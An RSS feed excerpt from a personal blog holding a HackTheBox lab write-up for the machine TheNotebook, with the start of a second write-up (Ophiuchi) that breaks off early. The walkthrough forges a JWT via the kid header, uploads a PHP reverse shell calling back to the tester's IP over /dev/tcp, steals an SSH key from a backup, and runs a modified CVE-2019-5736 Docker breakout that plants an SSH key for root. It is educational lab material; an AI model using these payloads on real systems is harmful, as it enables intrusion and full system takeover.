<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HackTheBox on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/writeups/hackthebox/</link>
    <description>Recent content in HackTheBox on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 19 May 2021 01:32:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/writeups/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - TheNotebook</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</guid>
      <description>Abusing JWT and breaking out of a Docker container</description>
      <content:encoded><![CDATA[<p>TheNotebook is a medium difficulty Linux machine that runs a web-based note application. The app uses a JWT token to store the authentication cookie, and it can be forged to escalate myself to admin. With admin-level access, I&rsquo;m able to drop a PHP web shell into the system using the upload functionality, which results in a shell access to the system. Enumeration of the system finds a backup files that contains SSH keys of the user. This user is allowed run a Docker container with <code>sudo</code>. Futhermore, the installed Docker version is vulnerable to CVE-2019-5736, and this could be exploited to obtain root access on the host.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>JWT Key ID</li>
<li>Docker breakout using CVE-2019-573</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://jwt.io">https://jwt.io</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TC scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ fscan 10.10.10.230 thenotebook
nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
Nmap scan report <span class="k">for</span> 10.10.10.230
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  />
</p>
<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
<p><img class="img-container" src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  />
</p>
<p>And the site automatically logs me in.</p>
<p><img class="img-container" src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  />
</p>
<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I will add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
<p><img class="img-container" src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  />
</p>
<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: <span class="m">12</span>
Connection: keep-alive

HTTP/1.1 <span class="m">200</span> OK
Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: <span class="m">1710</span>
Connection: keep-alive
</code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              txt
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
                                                                          
<span class="o">===============================================================</span>
2021/08/07 02:44:49 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
<p><img class="img-container" src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  />
</p>
<blockquote>
<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
</blockquote>
<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
<p><img class="img-container" src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  />
</p>
<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
<span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
</code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
</code></pre></div><p>I will put back the forged header to cookie and setup a Python web server afterwards. When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
<p><img class="img-container" src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to true and so the app will look for my private key and eventually validates my forged token using that key.</p>
<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using the Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
Generating public/private rsa key pair.
Your identification has been saved in privKey.key
Your public key has been saved in privKey.key.pub
The key fingerprint is:
SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
The key<span class="err">&#39;</span>s randomart image is:
+---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
<span class="p">|</span>        .o.      <span class="p">|</span>
<span class="p">|</span>o .   .. .o.     <span class="p">|</span>
<span class="p">|</span> B + ++.o+.      <span class="p">|</span>
<span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
<span class="p">|</span>.B.X   +S..      <span class="p">|</span>
<span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
<span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
<span class="p">|</span> ...*.           <span class="p">|</span>
<span class="p">|</span>  oB+            <span class="p">|</span>
+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</code></pre></div><p>I will use <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
<p><img class="img-container" src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  />
</p>
<p>When I refresh the browse, I see a new menu on the navigation bar called &ldquo;Admin Panel&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  />
</p>
<p>Heading to <code>/admin</code>, I see two options: <code>View Notes</code> and <code>Upload File</code>.</p>
<p><img class="img-container" src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  />
</p>
<p>The <code>View Notes</code> buttons points to <code>/admin/viewnotes</code>, and in this page all users' note can be viewed by the admin.</p>
<p><img class="img-container" src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  />
</p>
<p>Two interesting notes  created by the admin are <code>Need to fix config</code> and <code>Backups are scheduled</code>.</p>
<p><img class="img-container" src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  />
</p>
<p>The second note states that the server has regular backups set.</p>
<p><img class="img-container" src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  />
</p>
<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
<p><img class="img-container" src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  />
</p>
<h4 id="web-shell-upload">Web Shell Upload</h4>
<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
</code></pre></div><p>The file gets uploaded smoothly.</p>
<p><img class="img-container" src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  />
</p>
<p>The <code>View</code> buttons points to <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. I can confirm that I have code execution.</p>
<p><img class="img-container" src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  />
</p>
<p>I will upload the following PHP reverse shell and then setup a netcat listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>I will trigger the reverse using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
</code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@thenotebook:~/html$ 
</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will upgrade my shell to fully interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ which script
which script
/usr/bin/script
www-data@thenotebook:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@thenotebook:~/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «thenotebook» «10.10.14.17» 
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>

www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-noah">Shell as noah</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
/var/backups/home.tar.gz
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I will grab that file to my attacking machine.</p>
<p><img class="img-container" src="imgs/image-20210807165347848.png" alt="image-20210807165347848"  />
</p>
<p>The file contains an SSH private key for user <code>noah</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.17» 
$ tar -zxvf home.tar.gz
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
</code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
<p>With the obtained private key, I can SSH login into the machine as noah.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>

  System load:  0.03              Processes:              <span class="m">184</span>
  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
noah@thenotebook:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
</code></pre></div><p>User flag is done here</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
*881626900**9*271**710*266*9427*
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User noah is allowed to run <code>/usr/bin/docker exec -it webapp-dev01*</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo -l
Matching Defaults entries <span class="k">for</span> noah on thenotebook:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User noah may run the following commands on thenotebook:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
</code></pre></div><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
<p>The currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ docker version
Client:
 Version:           18.06.0-ce
 API version:       1.38
 Go version:        go1.10.3
 Git commit:        0ffa825
 Built:             Wed Jul <span class="m">18</span> 19:09:54 <span class="m">2018</span>
 OS/Arch:           linux/amd64
 Experimental:      <span class="nb">false</span>
Got permission denied <span class="k">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
</code></pre></div><p>To exploit this vulnerability, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. I will clone the PoC to my working directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
remote: Enumerating objects: 45, <span class="k">done</span>.
remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</code></pre></div><p>I will modify the payload of <code>main.go</code> to add my SSH public key to <code>authorized_keys</code> file of the root account.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
</code></pre></div><p>I will compile the PoC and host it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
root@0f4c2517af40:/opt/webapp# ./breakout
<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
</code></pre></div><p>Then on the second session, I will run the sudo command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
</code></pre></div><p>But then, on the container session, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
<span class="o">[</span>+<span class="o">]</span> Found the PID: self
strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
</code></pre></div><p>To resolve that, at line 42, I modified the &ldquo;pid&rdquo; loop to ignore anything that contains &ldquo;self&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
</span><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
		<span class="p">}</span> <span class="c1">// end
</span><span class="c1"></span>	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>I will recompile the exploit and get it back to the container, and this time it works!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
<span class="o">[</span>+<span class="o">]</span> Getting file handle
<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
root@c8cf4072ca26:/opt/webapp# 
</code></pre></div><p>For the full steps, see the image below.</p>
<p><img class="img-container" src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  />
</p>
<h4 id="ssh---root">SSH - Root</h4>
<p>I can SSH login into the machine as root using my own private keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»  
$ ssh root@10.10.10.230
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

  System load:  0.1               Processes:              <span class="m">190</span>
  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1


...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
root@thenotebook:~# 
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Ophiuchi</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</link>
      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</guid>
      <description>Reversing a wasm file</description>
      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to a deserialization attack. Exploiting the vulnerability results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, these files could be replaced with malicious ones to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>YAML deserialization attack</li>
<li>Web Assembly (WASM)</li>
<li>Code Analysis (Go &amp; WASM)</li>
<li>Sudo exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
